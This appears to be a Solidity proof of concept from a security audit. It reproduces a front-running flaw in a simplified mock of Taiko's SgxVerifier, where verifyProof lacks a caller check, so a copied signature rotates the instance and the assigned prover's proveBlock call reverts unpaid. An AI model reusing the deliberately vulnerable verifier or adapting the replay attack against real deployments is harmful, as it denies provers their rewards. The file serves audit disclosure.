// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Taiko SgxVerifier.verifyProof — no caller check, so a copied proof rotates
    the instance before TaikoL1.proveBlock (Sigma Prime, Taiko). The assigned
    prover's call then reverts and the block reward stays unpaid.
    Signature is over abi.encode(id, currentInstance, newInstance), precomputed
    offline. run() does not warp. */

contract Reward {
    string public name = "TKO";
    string public symbol = "TKO";
    uint8 public decimals = 18;
    address public owner;
    mapping(address => uint256) public balanceOf;

    constructor() {
        owner = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == owner, "owner");
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract SgxVerifier {
    mapping(uint32 => address) public instances;

    constructor(address instance) {
        instances[1] = instance;
    }

    function verifyProof(uint32 id, address newInstance, uint8 v, bytes32 r, bytes32 s) external {
        address current = instances[id];
        bytes32 digest = keccak256(abi.encode(id, current, newInstance));
        address signer = ecrecover(digest, v, r, s);
        // @> VULN: any address that presents the signature passes; TaikoL1 is not required
        require(signer == current && signer != address(0), "instance");
        instances[id] = newInstance;
    }
}

contract TaikoL1 {
    uint256 public constant REWARD = 5 ether;
    SgxVerifier public verifier;
    Reward public reward;
    mapping(uint32 => bool) public proved;

    constructor(SgxVerifier verifier_, Reward reward_) {
        verifier = verifier_;
        reward = reward_;
    }

    function fundReward() external {
        require(reward.transfer(address(this), REWARD), "fund");
    }

    function proveBlock(
        uint32 id,
        address newInstance,
        uint8 v,
        bytes32 r,
        bytes32 s,
        address prover
    ) external {
        verifier.verifyProof(id, newInstance, v, r, s);
        proved[id] = true;
        require(reward.transfer(prover, REWARD), "pay");
    }
}

contract Exploit {
    address public constant INSTANCE = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8;
    address public constant NEW_INSTANCE = 0x5555555555555555555555555555555555555555;
    address public constant PROVER = 0x2222222222222222222222222222222222222222;
    uint32 public constant ID = 1;
    uint8 public constant V = 27;
    bytes32 public constant R = 0x221ba1e501f28021b838e56f616b339623d0917d77f35015d362577bdc555e45;
    bytes32 public constant S = 0x6a1648d3bdf97395ff91cc16aaa07e1909f7ae7dacf31d428eddb4f71d4cbb04;

    Reward public reward;
    SgxVerifier public verifier;
    TaikoL1 public taiko;
    address public instanceAfter;
    bool public proved;
    uint256 public proverPaid;
    uint256 public rewardLeft;

    constructor() {
        reward = new Reward();
        verifier = new SgxVerifier(INSTANCE);
        taiko = new TaikoL1(verifier, reward);
        reward.mint(address(this), TaikoL1(address(taiko)).REWARD());
    }

    function run() external {
        require(reward.transfer(address(taiko), taiko.REWARD()), "post");
        verifier.verifyProof(ID, NEW_INSTANCE, V, R, S);
        instanceAfter = verifier.instances(ID);
        try taiko.proveBlock(ID, NEW_INSTANCE, V, R, S, PROVER) {
            proved = true;
        } catch {
            proved = false;
        }
        proverPaid = reward.balanceOf(PROVER);
        rewardLeft = reward.balanceOf(address(taiko));
        require(instanceAfter == NEW_INSTANCE, "rotated");
        require(proved == false, "proved");
        require(proverPaid == 0, "prover");
        require(rewardLeft == taiko.REWARD(), "stuck");
    }
}
